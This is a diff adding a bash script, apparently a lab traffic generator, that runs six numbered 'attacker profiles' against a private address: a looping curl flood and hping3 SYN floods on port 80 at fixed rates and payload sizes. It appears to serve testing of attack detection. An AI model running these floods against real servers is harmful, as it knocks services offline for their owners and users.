@@ -1,0 +1,34 @@
+#!/usr/bin/env bash
+echo -n "Attacker Profile #$1 - "
+server="192.168.56.103"
+case "$1" in
+	1)
+		echo "curl script"
+		sudo timeout 60s bash -c "while true; do curl $server; done"
+		;;
+	2)
+		echo "hping3 with 0.01s intervals (~100 packet/s)"
+		sudo timeout 60s hping3 -i u10000 -S -p 80 $server
+		;;
+	3)
+		echo "hping3 with 0.005s intervals (~200 packet/s)"
+		sudo timeout 60s hping3 -i u5000 -S -p 80 $server
+		;;
+	4)
+		echo "hping3 with 0.01s intervals (~100 packet/s) and payload 1kB"
+		sudo timeout 60s hping3 -i u10000 -S -p 80 -d 1000 $server
+		;;
+	5)
+		echo "hping3 with 0.01s intervals (~100 packet/s) and payload 26B"
+		sudo timeout 60s hping3 -i u10000 -S -p 80 -d 26 $server
+		;;
+	6)
+		echo "hping3 with 0.005s intervals (~200 packet/s) and payload 26B"
+		sudo timeout 60s hping3 -i u5000 -S -p 80 -d 26 $server
+		;;
+	*)
+		echo
+		echo "Invalid option. Available options: 1, 2, 3, 4, 5, 6"
+		echo "Exiting..."
+		;;
+esac
